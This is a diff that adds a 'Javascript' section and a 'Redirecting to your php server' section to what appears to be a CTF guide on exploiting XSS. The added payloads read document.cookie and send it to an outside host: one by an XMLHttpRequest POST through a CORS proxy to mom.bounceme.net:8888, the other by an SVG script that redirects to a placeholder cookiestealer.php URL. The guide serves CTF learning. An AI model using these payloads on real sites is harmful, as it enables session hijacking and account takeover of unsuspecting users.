@@ -64,3 +64,21 @@ On the pipedream dashboard, you will see a new endpoint url. This is the target 
 
 The final step after identifying an XSS vulnerability, crafting the payload, and preparing to receive a connection, is to get another users to trigger the exploit. Depending on the CTF, this might be done by "submitting" your payload to the CTF server, and some automated process using software like selenium might trigger the XSS and send the request back to your endpoint.  
 
+#### Javascript
+
+```text
+allCookies = document.cookie;
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://cors-anywhere.herokuapp.com/http://mom.bounceme.net:8888/");
+xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+xhr.send(allCookies);
+```
+
+#### Redirecting to your php server
+
+```text
+<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" x="0" y="0" width="194" height="200" id="xss"><script type="text/ecmascript">document.location='http://yourdomain:port/cookiestealer.php?c='+document.cookie;</script></svg>
+```
+
+
+
